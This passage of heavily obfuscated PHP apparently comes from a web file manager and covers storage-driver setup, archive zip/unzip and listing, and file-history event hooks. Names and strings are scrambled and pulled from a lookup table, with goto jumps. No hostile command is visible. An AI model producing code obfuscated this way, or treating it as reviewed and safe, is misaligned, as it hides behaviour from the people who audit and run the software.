{ $ôÔœïñ¤ =& $_SERVER[Ù×¯Ø…]; $Ï²áºî± = array_to_keyvalue(parent::listData(), $ôÔœïñ¤[28]); if (isset($Ï²áºî±[$áø²¹À½[$ôÔœïñ¤[28]]])) { return !1; } $this->checkConfig($áø²¹À½); $òŸÒÄ›³ = parent::insert($áø²¹À½); if ($òŸÒÄ›³ && $áø²¹À½[$ôÔœïñ¤[34]]) { foreach ($Ï²áºî± as $£×“é¨) { if ($£×“é¨[$ôÔœïñ¤[34]]) { parent::update($£×“é¨[$ôÔœïñ¤[395]], array($ôÔœïñ¤[34] => 0)); } } } return $òŸÒÄ›³; } public function checkConfig(&$•»òµ·Ç, $ËŠÛší = false) { $Ïªš˜Š’ =& $_SERVER[Ù×¯Ø…]; $È€¤©´ = strtolower($•»òµ·Ç[$Ïªš˜Š’[94]]); $²¾äùÌ = json_decode($•»òµ·Ç[$Ïªš˜Š’[6]], !0); foreach ($²¾äùÌ as $Îø÷¢¨¼ => $³¼úğìÅ) { $²¾äùÌ[$Îø÷¢¨¼] = trim($³¼úğìÅ); } $²¾äùÌ[$Ïªš˜Š’[2054]] = rand_string(6); $°––êƒò = $GLOBALS[$Ïªš˜Š’[6]][$Ïªš˜Š’[88]][$Ïªš˜Š’[832]]; $¹íÏ¤‘Ø = isset($°––êƒò[$È€¤©´]) ? $°––êƒò[$È€¤©´] : ucfirst($È€¤©´); $ÁÈşÉ½¹ = $Ïªš˜Š’[72] . $¹íÏ¤‘Ø; if (!$¹íÏ¤‘Ø || !class_exists($ÁÈşÉ½¹)) { if ($ËŠÛší) { return LNG($Ïªš˜Š’[2055]); } write_log(array($Ïªš˜Š’[2056], $•»òµ·Ç, get_caller_info()), $Ïªš˜Š’[2057]); show_json(LNG($Ïªš˜Š’[2055]), !1, $•»òµ·Ç); } $§æ–Ÿå = new $ÁÈşÉ½¹($²¾äùÌ); if (in_array($È€¤©´, $§æ–Ÿå->objectDriver)) { if (!$§æ–Ÿå->isBucketCors() && !$§æ–Ÿå->setBucketCors()) { $ä‚…İƒ = LNG($Ïªš˜Š’[2058]); $ä‚…İƒ .= $Ïªš˜Š’[2059] . LNG($Ïªš˜Š’[2060]); if ($ËŠÛší) { return $ä‚…İƒ; } show_json($ä‚…İƒ, !1); } } $Œ®ä¾–’ = rtrim($²¾äùÌ[$Ïªš˜Š’[1111]], $Ïªš˜Š’[8]) . $Ïªš˜Š’[8]; $ä“ê®Ê = $§æ–Ÿå->getPath($Œ®ä¾–’ . $Ïªš˜Š’[1173]); if (!$§æ–Ÿå->mkfile($ä“ê®Ê)) { if ($ËŠÛší) { return LNG($Ïªš˜Š’[2058]); } show_json(LNG($Ïªš˜Š’[2058]), !1); } $²¾äùÌ[$Ïªš˜Š’[1111]] = $Œ®ä¾–’; $•»òµ·Ç[$Ïªš˜Š’[6]] = json_encode($²¾äùÌ); $•»òµ·Ç[$Ïªš˜Š’[94]] = $¹íÏ¤‘Ø; return !0; } public function driverListSystem() { $•Ä—ˆ©œ =& $_SERVER[Ù×¯Ø…]; $Ñ…úÖ× = parent::listData(); $Åº«¥Ô´ = array(); foreach ($Ñ…úÖ× as $Ïç ‚¸Ú) { unset($Ïç ‚¸Ú[$•Ä—ˆ©œ[194]], $Ïç ‚¸Ú[$•Ä—ˆ©œ[84]]); $Ïç ‚¸Ú[$•Ä—ˆ©œ[6]] = json_decode($Ïç ‚¸Ú[$•Ä—ˆ©œ[6]], !0); $Åº«¥Ô´[] = $Ïç ‚¸Ú; } return $Åº«¥Ô´; } public function defaultDriver() { $¿’ŞóŠù =& $_SERVER[Ù×¯Ø…]; $ù«½ˆ = parent::listData(); $Ù¸Óƒ‘• = array_filter_by_field($ù«½ˆ, $¿’ŞóŠù[34], 1); $Ù¸Óƒ‘• = $Ù¸Óƒ‘•[0]; if ($Ù¸Óƒ‘•) { $Ù¸Óƒ‘•[$¿’ŞóŠù[6]] = json_decode($Ù¸Óƒ‘•[$¿’ŞóŠù[6]], !0); } return $Ù¸Óƒ‘•; } public function driverInfo($µä‘š´„) { $ğÑ÷˜·¡ =& $_SERVER[Ù×¯Ø…]; $Àİ§×‘½ = array_to_keyvalue(parent::listData(), $ğÑ÷˜·¡[395]); if (!isset($Àİ§×‘½[$µä‘š´„])) { return !1; } $ğ¼ÁÑ¤î = $Àİ§×‘½[$µä‘š´„]; $ğ¼ÁÑ¤î[$ğÑ÷˜·¡[6]] = json_decode($ğ¼ÁÑ¤î[$ğÑ÷˜·¡[6]], !0); return $ğ¼ÁÑ¤î; } public function remove($ğĞßòÉĞ) { $this->removeShareItems($ğĞßòÉĞ); return parent::remove($ğĞßòÉĞ); } public function removeWithFile($¤â¾‡ŸÎ, $‹¶¬Ş·Ô) { $Ââá„–ò =& $_SERVER[Ù×¯Ø…]; $ˆâ¼É©× = array($Ââá„–ò[823] => $¤â¾‡ŸÎ); $øÈÆÚ´å = Model($Ââá„–ò[473])->where($ˆâ¼É©×)->count(); $ºÛÌ©ç = Model($Ââá„–ò[473])->where($ˆâ¼É©×)->sum($Ââá„–ò[78]); $¯’ï¯Ô› = $‹¶¬Ş·Ô . $Ââá„–ò[2061] . $¤â¾‡ŸÎ; $İ£´Ï¥â = new TaskFileTransfer($¯’ï¯Ô›, $Ââá„–ò[2057], $øÈÆÚ´å, LNG($Ââá„–ò[2062]) . "\50{$¤â¾‡ŸÎ}\51"); $İ£´Ï¥â->task[$Ââá„–ò[762]] = (double) $ºÛÌ©ç; $¤ûÂ•× = KodIO::defaultDriver(); $³—ƒÏíæ = $¤ûÂ•×[$Ââá„–ò[395]]; $›’Ÿ¼œó = "\173\151\157\x3a{$³—ƒÏíæ}\175\57"; $×ÕÇ‚ÙÔ = !0; $—¸÷¯³ = array(); $Ğç©­ªó = Model($Ââá„–ò[193])->where($ˆâ¼É©×)->field($Ââá„–ò[2063])->select(); foreach ($Ğç©­ªó as $äÊÕŸÁà) { $•™åñ°² = $äÊÕŸÁà[$Ââá„–ò[76]]; $İåŞ„’‹ = $›’Ÿ¼œó . str_replace("\x7b\151\157\72{$¤â¾‡ŸÎ}\x7d\x2f", $Ââá„–ò[33], $•™åñ°²); if (!IO::exist($•™åñ°²)) { $—¸÷¯³[] = $äÊÕŸÁà[$Ââá„–ò[470]]; $İ£´Ï¥â->updateFileEnd($äÊÕŸÁà[$Ââá„–ò[28]], $äÊÕŸÁà[$Ââá„–ò[78]]); continue; } if (IO::exist($İåŞ„’‹)) { $İ£´Ï¥â->updateFileEnd($äÊÕŸÁà[$Ââá„–ò[28]], $äÊÕŸÁà[$Ââá„–ò[78]]); continue; } if (!IO::move($•™åñ°², get_path_father($İåŞ„’‹))) { $×ÕÇ‚ÙÔ = !1; break; } $ˆâ¼É©× = array($Ââá„–ò[470] => $äÊÕŸÁà[$Ââá„–ò[470]]); $Ÿ˜§ö·ù = array($Ââá„–ò[823] => $³—ƒÏíæ, $Ââá„–ò[76] => $İåŞ„’‹); Model($Ââá„–ò[193])->where($ˆâ¼É©×)->save($Ÿ˜§ö·ù); } $this->removeByFileID($—¸÷¯³); if (!$×ÕÇ‚ÙÔ) { $İ£´Ï¥â->stop($¯’ï¯Ô›); return !1; } $İ£´Ï¥â->end(); if ($‹¶¬Ş·Ô == $Ââá„–ò[1716]) { $this->remove($¤â¾‡ŸÎ); } } public function progress($ ¥÷ğÀ, $ıÀ°ÉŒ”) { return Task::get($ıÀ°ÉŒ” . $_SERVER[Ù×¯Ø…][2061] . $ ¥÷ğÀ); } private function removeByFileID($åàíçßÊ = array()) { $©Ì·Îœ³ =& $_SERVER[Ù×¯Ø…]; if (empty($åàíçßÊ)) { return; } $ª©˜Äù = array($©Ì·Îœ³[470] => array($©Ì·Îœ³[7], $åàíçßÊ)); $Óö‚áøÖ = Model($©Ì·Îœ³[1253])->where($ª©˜Äù)->field($©Ì·Îœ³[406])->select(); if (!$Óö‚áøÖ) { return; } $Óö‚áøÖ = array_to_keyvalue($Óö‚áøÖ, $©Ì·Îœ³[33], $©Ì·Îœ³[406]); foreach ($Óö‚áøÖ as $êÁå¤º) { Model($©Ì·Îœ³[420])->removeNow($êÁå¤º, !1); } } private function removeShareItems($òíĞ’¾²) { $£èõÒá =& $_SERVER[Ù×¯Ø…]; $ı„¥±©à = "\173\151\157\x3a{$òíĞ’¾²}\175\57"; $¯Á¼Ôë = array($£èõÒá[406] => 0, $£èõÒá[1106] => array($£èõÒá[381], "{$ı„¥±©à}\45")); $ĞààıØ¹ = Model($£èõÒá[1727])->where($¯Á¼Ôë)->field($£èõÒá[491])->select(); if (empty($ĞààıØ¹)) { return; } $µ®êİÃ¥ = array_to_keyvalue($ĞààıØ¹, $£èõÒá[33], $£èõÒá[491]); Model($£èõÒá[598])->remove($µ®êİÃ¥); } } goto C»ƒáÅó‰; C„Šêˆ—Ú: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¾²±ß›Á; if (!$¾²±ß›Á) { $ìîÎüÛå = IO::init($_SERVER[Ù×¯Ø…][8]); } return $ìîÎüÛå; } private static function iconvSystem($Ú×Ş£‰Ì) { return self::local()->iconvSystem($Ú×Ş£‰Ì); } private static function iconvApp($¸ï  é‹) { return self::local()->iconvApp($¸ï  é‹); } public static function zip($šÀ‹ ¿«, $÷å…ãÆ¬ = "\x7a\x69\x70", $˜‰ø¼ÍÇ = '', $Ò¿‡‡éˆ = REPEAT_RENAME) { $„À¶ åı =& $_SERVER[Ù×¯Ø…]; $ÕÔ£×î¼ = self::init($šÀ‹ ¿«[0][$„À¶ åı[76]]); $¡éÅ‡ƒù = self::info($šÀ‹ ¿«[0][$„À¶ åı[76]]); $Û÷İÄÏĞ = !1; if (!$˜‰ø¼ÍÇ && $ÕÔ£×î¼->getType() == $„À¶ åı[106]) { $«ŒŞÌÒÀ = self::zipFileList($šÀ‹ ¿«); } else { $Û÷İÄÏĞ = $˜‰ø¼ÍÇ ? $˜‰ø¼ÍÇ : TEMP_FILES . $„À¶ åı[1114] . time() . rand_string(8) . $„À¶ åı[8]; mk_dir($Û÷İÄÏĞ); $«ŒŞÌÒÀ = self::zipFileList($šÀ‹ ¿«, $Û÷İÄÏĞ); } $½¡®æí¤ = $¡éÅ‡ƒù[$„À¶ åı[28]]; if (count($«ŒŞÌÒÀ) > 1) { $»æ–«·¬ = IO::info(IO::pathFather($¡éÅ‡ƒù[$„À¶ åı[76]])); $½¡®æí¤ = $»æ–«·¬[$„À¶ åı[28]]; } $ó×­ª¤ã = $Û÷İÄÏĞ; if (!$ó×­ª¤ã) { $ó×­ª¤ã = get_path_father($¡éÅ‡ƒù[$„À¶ åı[76]]); if (!$˜‰ø¼ÍÇ && $ÕÔ£×î¼->getType() == $„À¶ åı[106]) { $ó×­ª¤ã = get_path_father($ÕÔ£×î¼->path); } $¸ö¤äÌ¥ = IO::info($ó×­ª¤ã); if (!$¸ö¤äÌ¥[$„À¶ åı[196]]) { show_json(LNG($„À¶ åı[1115]), !1); } } $õáË¸³Š = $ó×­ª¤ã . $½¡®æí¤ . $„À¶ åı[95] . $÷å…ãÆ¬; $õáË¸³Š = get_filename_auto($õáË¸³Š, $„À¶ åı[33], $Ò¿‡‡éˆ); $˜ëĞğµø = self::iconvSystem($õáË¸³Š); foreach ($«ŒŞÌÒÀ as $ÏœÎµˆ­ => $¸àş´ş„) { $«ŒŞÌÒÀ[$ÏœÎµˆ­] = self::iconvSystem($¸àş´ş„); } KodArchive::create($˜ëĞğµø, $«ŒŞÌÒÀ); if (!IO::exist($õáË¸³Š)) { if ($Û÷İÄÏĞ) { del_dir($Û÷İÄÏĞ); } show_json(LNG($„À¶ åı[1116]), !1); } if ($˜‰ø¼ÍÇ || !$Û÷İÄÏĞ) { if ($Û÷İÄÏĞ && strstr($Û÷İÄÏĞ, TEMP_FILES)) { $œóİò¹” = $«ŒŞÌÒÀ = array(); recursion_dir($ó×­ª¤ã, $œóİò¹”, $«ŒŞÌÒÀ, 0); foreach ($œóİò¹” as $¡‹éÔè’) { del_dir($¡‹éÔè’); } foreach ($«ŒŞÌÒÀ as $»Éì–) { if ($»Éì– == $˜ëĞğµø) { continue; } del_file($»Éì–); } } return $õáË¸³Š; } $™¦»Êˆ· = self::pathFather($¡éÅ‡ƒù[$„À¶ åı[76]]); $´¸ÈÁ• = self::move($õáË¸³Š, $™¦»Êˆ·, $Ò¿‡‡éˆ); if (!$´¸ÈÁ•) { del_dir($Û÷İÄÏĞ); show_json(LNG($„À¶ åı[1116]), !1); } del_dir($Û÷İÄÏĞ); return $´¸ÈÁ•; } public static function unzip($íÓõŠ, $ßñî†Â  = "\x72\x65\160\x6c\x61\143\145") { $Ñ¼å£çç =& $_SERVER[Ù×¯Ø…]; $Ğ…ÙòÀ = $íÓõŠ[$Ñ¼å£çç[76]]; $ŸÌÁ™£ = $íÓõŠ[$Ñ¼å£çç[1117]]; if (!($”ŠÎ€¥ = parent::info($Ğ…ÙòÀ))) { show_json(LNG($Ñ¼å£çç[1118]), !1); } if (!($ÛèÌ³áæ = parent::infoFull($ŸÌÁ™£))) { $ŸÌÁ™£ = parent::mkdir($ŸÌÁ™£); $ÛèÌ³áæ = array($Ñ¼å£çç[76] => $ŸÌÁ™£); } else { if (isset($ÛèÌ³áæ[$Ñ¼å£çç[406]]) && trim($ÛèÌ³áæ[$Ñ¼å£çç[76]], $Ñ¼å£çç[8]) != trim($ŸÌÁ™£, $Ñ¼å£çç[8])) { $ßöÂÌ¬Ò = KodIO::make($ÛèÌ³áæ[$Ñ¼å£çç[501]]); $å‚Æ¾º˜ = parent::fileNameAuto($ßöÂÌ¬Ò, $ÛèÌ³áæ[$Ñ¼å£çç[28]], REPEAT_RENAME_FOLDER, !0); $ŸÌÁ™£ = parent::mkdir($ßöÂÌ¬Ò . $å‚Æ¾º˜); $ÛèÌ³áæ = array($Ñ¼å£çç[76] => $ŸÌÁ™£); } } $ŸÌÁ™£ = $ÛèÌ³áæ[$Ñ¼å£çç[76]]; $¸Ş½Ğ‚œ = self::tmpFileName($”ŠÎ€¥); $í½æÄìë = TEMP_FILES . $¸Ş½Ğ‚œ; del_dir($í½æÄìë); mk_dir($í½æÄìë); $ÛÌİÎ‘ƒ = self::fileExt($”ŠÎ€¥); $‰ÕîÆİ = $í½æÄìë . $Ñ¼å£çç[95] . $ÛÌİÎ‘ƒ; if (!@file_exists(self::iconvSystem($‰ÕîÆİ))) { $¦–„â‹× = self::localFilePath($Ğ…ÙòÀ, $ÛÌİÎ‘ƒ); $‰ÕîÆİ = $¦–„â‹× ? $¦–„â‹× : parent::download($Ğ…ÙòÀ, $‰ÕîÆİ); } $‰ÕîÆİ = self::iconvSystem($‰ÕîÆİ); $÷ıÀé½ë = isset($íÓõŠ[$Ñ¼å£çç[1119]]) ? $íÓõŠ[$Ñ¼å£çç[1119]] : $Ñ¼å£çç[1120]; $âİ”ù£– = KodArchive::extract($‰ÕîÆİ, $í½æÄìë . $Ñ¼å£çç[8], $÷ıÀé½ë); self::archiveExt(); if (!$âİ”ù£–[$Ñ¼å£çç[1121]]) { show_json($Ñ¼å£çç[1122] . $âİ”ù£–[$Ñ¼å£çç[1123]], !1); } Hook::trigger($Ñ¼å£çç[1124], $í½æÄìë); recursion_dir($í½æÄìë, $™­ëĞˆ, $æ£Á–ˆÕ, 0); $ìÃŒÅğê = array_merge($™­ëĞˆ, $æ£Á–ˆÕ); foreach ($ìÃŒÅğê as $Ñíì¿ù) { $Ñíì¿ù = self::iconvApp($Ñíì¿ù); self::move($Ñíì¿ù, $ŸÌÁ™£, $ßñî†Â ); } del_dir($í½æÄìë); if (!$¦–„â‹×) { del_file($‰ÕîÆİ); } return !0; } public static function unzipList($ÅìÃã…ó) { $ğœıòÍĞ =& $_SERVER[Ù×¯Ø…]; $”»Ò¦¡ì = $ÅìÃã…ó[$ğœıòÍĞ[76]]; $€”åÙ¿ô = isset($ÅìÃã…ó[$ğœıòÍĞ[1125]]) ? $ÅìÃã…ó[$ğœıòÍĞ[1125]] : -1; $ô°…„Å• = 50000; if (request_url_safe($”»Ò¦¡ì)) { $ÌÆœ¼Úá = parse_url_query($”»Ò¦¡ì); if (!isset($ÌÆœ¼Úá[$ğœıòÍĞ[76]])) { show_json($ğœıòÍĞ[1126], !1); } } $Şûô¼£ = isset($ÌÆœ¼Úá) ? $ÌÆœ¼Úá[$ğœıòÍĞ[76]] : $”»Ò¦¡ì; $á×áÆ”Í = self::info($Şûô¼£); $ÙøšÛÖİ = self::fileExt($á×áÆ”Í); $ß£ç Ã° = self::tmpFileName($á×áÆ”Í); if (isset($ÌÆœ¼Úá)) { $¹ÕÅ™ = array($ÌÆœ¼Úá[$ğœıòÍĞ[76]], $ÌÆœ¼Úá[$ğœıòÍĞ[1125]], $ÌÆœ¼Úá[$ğœıòÍĞ[28]]); $™ó·û˜÷ = md5(implode($ğœıòÍĞ[71], $¹ÕÅ™)) . $ğœıòÍĞ[95] . get_path_ext($ÌÆœ¼Úá[$ğœıòÍĞ[28]]); } else { $¹ÕÅ™ = array($á×áÆ”Í[$ğœıòÍĞ[28]], $á×áÆ”Í[$ğœıòÍĞ[76]], $á×áÆ”Í[$ğœıòÍĞ[78]]); $™ó·û˜÷ = md5(implode($ğœıòÍĞ[71], $¹ÕÅ™)) . $ğœıòÍĞ[95] . $ÙøšÛÖİ; } if ($€”åÙ¿ô == -1) { $Û”ò¨Ğ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\126\151\x65\x77\57{$ß£ç Ã°}\57{$™ó·û˜÷}\x2e\154\157\147"; $ÏÛ¶ÏÚ = self::infoFull($Û”ò¨Ğ); if ($ÏÛ¶ÏÚ) { $Û”ò¨Ğ = $ÏÛ¶ÏÚ[$ğœıòÍĞ[76]]; $´²üÎíñ = self::getContent($Û”ò¨Ğ); if ($´²üÎíñ) { $üı¶ŠÉ‚ = json_decode($´²üÎíñ, !0); $üı¶ŠÉ‚ = is_array($üı¶ŠÉ‚) ? $üı¶ŠÉ‚ : array(); if (count($üı¶ŠÉ‚) >= $ô°…„Å•) { show_json(sprintf(LNG($ğœıòÍĞ[1127]), count($üı¶ŠÉ‚)), !1); } return $üı¶ŠÉ‚; } } else { $Û”ò¨Ğ = self::mkfile($Û”ò¨Ğ); } } $–÷®Î×Œ = TEMP_FILES . $ß£ç Ã°; if (!is_dir($–÷®Î×Œ)) { mk_dir($–÷®Î×Œ); } $¹Í†ëÁã = $–÷®Î×Œ . $ğœıòÍĞ[8] . $™ó·û˜÷; if (!@file_exists(self::iconvSystem($¹Í†ëÁã))) { if (isset($ÌÆœ¼Úá)) { url_request($”»Ò¦¡ì, $ğœıòÍĞ[1128], $¹Í†ëÁã); } else { $°ƒÛÁ‹ = self::localFilePath($”»Ò¦¡ì, $ÙøšÛÖİ); $¹Í†ëÁã = $°ƒÛÁ‹ ? $°ƒÛÁ‹ : self::download($”»Ò¦¡ì, $¹Í†ëÁã); } } $¹Í†ëÁã = self::iconvSystem($¹Í†ëÁã); if ($€”åÙ¿ô >= 0) { $ƒÛá• = isset($ÅìÃã…ó[$ğœıòÍĞ[1129]]) ? $ÅìÃã…ó[$ğœıòÍĞ[1129]] : !1; $ö„Œøù© = isset($ÅìÃã…ó[$ğœıòÍĞ[28]]) ? $ÅìÃã…ó[$ğœıòÍĞ[28]] : $ğœıòÍĞ[33]; KodArchive::filePreview($¹Í†ëÁã, $€”åÙ¿ô, $ƒÛá•, $ö„Œøù©); self::archiveExt(); die; } $§½ßÀë² = KodArchive::listContent($¹Í†ëÁã); self::archiveExt(); del_dir($–÷®Î×Œ); if (!$§½ßÀë²[$ğœıòÍĞ[1121]]) { show_json($§½ßÀë²[$ğœıòÍĞ[1123]], !1); } $üı¶ŠÉ‚ = json_encode($§½ßÀë²[$ğœıòÍĞ[1123]]); self::setContent($Û”ò¨Ğ, $üı¶ŠÉ‚); if (count($§½ßÀë²[$ğœıòÍĞ[1123]]) >= $ô°…„Å•) { show_json(sprintf(LNG($ğœıòÍĞ[1127]), count($§½ßÀë²[$ğœıòÍĞ[1123]])), !1); } return $§½ßÀë²[$ğœıòÍĞ[1123]]; } private static function fileExt($…ïºìä) { $ßÜÙ…¬œ =& $_SERVER[Ù×¯Ø…]; $õ€ı«›¥ = $…ïºìä[$ßÜÙ…¬œ[168]]; if ($õ€ı«›¥ == $ßÜÙ…¬œ[1130]) { $ ëèí“ = $ßÜÙ…¬œ[1131]; if (substr($…ïºìä[$ßÜÙ…¬œ[28]], -strlen($ ëèí“)) == $ ëèí“) { $õ€ı«›¥ = $ßÜÙ…¬œ[1132]; } } self::archiveExt($õ€ı«›¥); return $õ€ı«›¥; } private static function zipFileList($úÖÚË²á, $å’ÅÙ³ = false) { $Ø×ÈÚÀ‡ =& $_SERVER[Ù×¯Ø…]; $€Üùâö = array(); foreach ($úÖÚË²á as $³ãêôğ½) { $ŠàÎè¬± = $³ãêôğ½[$Ø×ÈÚÀ‡[76]]; if ($å’ÅÙ³) { $ŠàÎè¬± = self::copy($³ãêôğ½[$Ø×ÈÚÀ‡[76]], $å’ÅÙ³, $Ø×ÈÚÀ‡[824]); } else { $ƒ©ïá = self::init($³ãêôğ½[$Ø×ÈÚÀ‡[76]]); if ($ƒ©ïá->getType() == $Ø×ÈÚÀ‡[106]) { $ŠàÎè¬± = $ƒ©ïá->path; } } if ($ŠàÎè¬± && self::local()->exist($ŠàÎè¬±)) { $€Üùâö[$³ãêôğ½[$Ø×ÈÚÀ‡[76]]] = $ŠàÎè¬±; } } if (!empty($€Üùâö)) { return array_values($€Üùâö); } show_json(LNG($Ø×ÈÚÀ‡[1096]), !1); } public static function tmpFileName($ÅÙ»Ó™¼) { $ßŸÌæ¤‘ =& $_SERVER[Ù×¯Ø…]; $æÛ ûÆ = array($ÅÙ»Ó™¼[$ßŸÌæ¤‘[28]], $ÅÙ»Ó™¼[$ßŸÌæ¤‘[76]], $ÅÙ»Ó™¼[$ßŸÌæ¤‘[78]], $ÅÙ»Ó™¼[$ßŸÌæ¤‘[524]]); return md5(implode($ßŸÌæ¤‘[71], $æÛ ûÆ)); } private static function localFilePath($õ¾”ª™, $Ñè¦…) { $Á‰Õ«´ì =& $_SERVER[Ù×¯Ø…]; if ($Ñè¦… == $Á‰Õ«´ì[1133] && strtoupper(substr(PHP_OS, 0, 3)) == $Á‰Õ«´ì[1134]) { return !1; } $—ÌŒê¸” = KodIO::parse($õ¾”ª™); if ($—ÌŒê¸”[$Á‰Õ«´ì[29]] == KodIO::KOD_SOURCE) { $áÙ‡‚û× = Model($Á‰Õ«´ì[831])->fileInfoGet(KodIO::sourceID($õ¾”ª™)); if (!$áÙ‡‚û×[$Á‰Õ«´ì[76]]) { show_json($Á‰Õ«´ì[1135], !1); } $õ¾”ª™ = $áÙ‡‚û×[$Á‰Õ«´ì[76]]; } $¯§äƒóÖ = self::init($õ¾”ª™); if ($¯§äƒóÖ->pathParse[$Á‰Õ«´ì[1083]]) { $õ¾”ª™ = $¯§äƒóÖ->pathParse[$Á‰Õ«´ì[1083]]; $¯§äƒóÖ = self::init($õ¾”ª™); } $—Ÿ—éşá = $¯§äƒóÖ->getType(); if ($—Ÿ—éşá == $Á‰Õ«´ì[106] || $—Ÿ—éşá == $Á‰Õ«´ì[1136]) { if (!$¯§äƒóÖ->exist($¯§äƒóÖ->path)) { show_json(LNG($Á‰Õ«´ì[105]), !1); } return $¯§äƒóÖ->path; } return !1; } private static function archiveExt($†šñ™ú¯ = '') { $GLOBALS[$_SERVER[Ù×¯Ø…][1137]] = $†šñ™ú¯; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ºò¶û¬È =& $_SERVER[Ù×¯Ø…]; $¶…ıĞ¤» = $GLOBALS[$ºò¶û¬È[6]][$ºò¶û¬È[88]]; if ($¶…ıĞ¤»[$ºò¶û¬È[1138]] != 1) { return; } if ($¶…ıĞ¤»[$ºò¶û¬È[1139]] <= 0) { return; } if (isset($_REQUEST[$ºò¶û¬È[1140]]) && $_REQUEST[$ºò¶û¬È[1140]] == $ºò¶û¬È[87]) { return; } Hook::bind($ºò¶û¬È[1141], $ºò¶û¬È[1142]); Hook::bind($ºò¶û¬È[1143], $ºò¶û¬È[1144]); Hook::bind($ºò¶û¬È[1145], $ºò¶û¬È[1146]); Hook::bind($ºò¶û¬È[1147], $ºò¶û¬È[1148]); Hook::bind($ºò¶û¬È[1149], $ºò¶û¬È[1150]); Hook::bind($ºò¶û¬È[1151], $ºò¶û¬È[1152]); } public static function eventBeforeUpload($òõá‰ÓÚ) { if ($òõá‰ÓÚ[3] && $òõá‰ÓÚ[3] != REPEAT_REPLACE) { return; } $ëîÒ—­• = self::parsePath($òõá‰ÓÚ[0]); if (!$ëîÒ—­•) { return; } self::add($ëîÒ—­•); } public static function eventBeforeEdit($¸ú‹¼¹­) { $œÒ°ï…¡ = self::parsePath($¸ú‹¼¹­[0]); if (!$œÒ°ï…¡) { return; } self::add($œÒ°ï…¡); } public static function eventBeforeCopyFile($ „ëÈı…, $™“Ä‚¼, $‘îÔğÕğ, $¦±ÏÏê², $‹ü¿†Æ¸, $Û÷€èÛ¶) { $€°äßÙŞ = $‘îÔğÕğ->getPathOuter($¦±ÏÏê²); $‹±ˆ¯ĞŒ = self::parsePath($€°äßÙŞ); if (!$‹±ˆ¯ĞŒ) { return; } self::add($‹±ˆ¯ĞŒ); } public static function eventBeforeRename($¥²ÂŸæ°) { $İ££İÚŞ =& $_SERVER[Ù×¯Ø…]; $£»òË‚˜ = self::parsePath($¥²ÂŸæ°[0]); if (!$£»òË‚˜) { return; } $ƒá¼Ä—ô = self::checkInHistory($£»òË‚˜); if (!$ƒá¼Ä—ô) { return; } if ($ƒá¼Ä—ô[$İ££İÚŞ[29]] == $İ££İÚŞ[193]) { $çª•Öß = self::listData($£»òË‚˜); if ($çª•Öß && $çª•Öß[$İ££İÚŞ[367]]) { self::moveHistory($£»òË‚˜, $¥²ÂŸæ°[1]); } } else { IO::rename($ƒá¼Ä—ô[$İ££İÚŞ[76]], $¥²ÂŸæ°[1]); } } public static function eventBeforeMove($Å±³ÉÜ) { $‡åîßØ =& $_SERVER[Ù×¯Ø…]; $äâŠÍùİ = self::parsePath($Å±³ÉÜ[0]); if (!$äâŠÍùİ) { return; } $œñ¡Å– = self::parsePath($Å±³ÉÜ[1]); if (!$œñ¡Å–) { return; } $È×·Õ¹ª = $Å±³ÉÜ[3]; $³š¡ìñª = self::checkInHistory($äâŠÍùİ); if (!$³š¡ìñª) { return; } $»¾¯Ä = self::pathHistory($œñ¡Å–); if ($³š¡ìñª[$‡åîßØ[29]] == $‡åîßØ[193]) { $±ôŒ³„‡ = self::listData($äâŠÍùİ); $¯ÊÔÈôİ = rtrim($œñ¡Å–, $‡åîßØ[8]) . $‡åîßØ[8] . ($È×·Õ¹ª ? $È×·Õ¹ª : get_path_this($äâŠÍùİ)); $Ñ—ÏÄ­ = self::listData($¯ÊÔÈôİ); if ($±ôŒ³„‡ && $±ôŒ³„‡[$‡åîßØ[367]] && $Ñ—ÏÄ­ && $Ñ—ÏÄ­[$‡åîßØ[367]]) { return self::clear($äâŠÍùİ); } if ($±ôŒ³„‡ && $±ôŒ³„‡[$‡åîßØ[367]]) { self::moveHistory($äâŠÍùİ, $È×·Õ¹ª, $»¾¯Ä); } } else { IO::move($³š¡ìñª[$‡åîßØ[76]], $»¾¯Ä, !1, $È×·Õ¹ª); self::clearEmptyFolder(IO::pathFather($³š¡ìñª[$‡åîßØ[76]])); } } public static function eventAfterRemove($Ğ§£áà¢, $İËß¾ò„) { $ë›¬ßŸÑ =& $_SERVER[Ù×¯Ø…]; if (!$İËß¾ò„) { return; } $ÒËÚÏ’¡ = self::parsePath($Ğ§£áà¢[0]); if (!$ÒËÚÏ’¡) { return; } $­ôïşßÍ = self::checkInHistory($ÒËÚÏ’¡); if (!$­ôïşßÍ) { return; } if ($­ôïşßÍ[$ë›¬ßŸÑ[29]] == $ë›¬ßŸÑ[193]) { $Óƒ¥şâ = self::listData($ÒËÚÏ’¡, !1); if ($Óƒ¥şâ && $Óƒ¥şâ[$ë›¬ßŸÑ[367]]) { self::clear($ÒËÚÏ’¡, !1); } } else { IO::remove($­ôïşßÍ[$ë›¬ßŸÑ[76]]); self::clearEmptyFolder(IO::pathFather($­ôïşßÍ[$ë›¬ßŸÑ[76]])); } } private static function checkInHistory($šŞÀŞé) { $³µÓøš¥ = self::pathHistory($šŞÀŞé); if (!IO::exist($³µÓøš¥)) { $³µÓøš¥ .= $_SERVER[Ù×¯Ø…][1153]; } return IO::exist($³µÓøš¥) ? IO::info($³µÓøš¥) : !1; } private static function parsePath($¿Ö¯°¥) { $®ãŞ¤Ô =& $_SERVER[Ù×¯Ø…]; if (!$¿Ö¯°¥) { return !1; } if ($GLOBALS[$®ãŞ¤Ô[1154]]) { return; } $Ê¦üè¬ = KodIO::parse($¿Ö¯°¥); $•ŸûÃ³ = $Ê¦üè¬[$®ãŞ¤Ô[29]]; $àˆµöù = !$•ŸûÃ³ || $•ŸûÃ³ == KodIO::KOD_IO || $•ŸûÃ³ == KodIO::KOD_SHARE_ITEM; if (!$àˆµöù || !$Ê¦üè¬[$®ãŞ¤Ô[1155]]) { return !1; } if (substr($¿Ö¯°¥, 0, strlen(DATA_PATH . $®ãŞ¤Ô[1156])) == DATA_PATH . $®ãŞ¤Ô[1156]) { return !1; } if ($•ŸûÃ³ == KodIO::KOD_SHARE_ITEM) { $çêúÈ±¼ = IO::init($¿Ö¯°¥); if ($çêúÈ±¼->pathParse[$®ãŞ¤Ô[1083]]) { return self::parsePath($çêúÈ±¼->pathParse[$®ãŞ¤Ô[1083]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ƒÜ„›™¶ 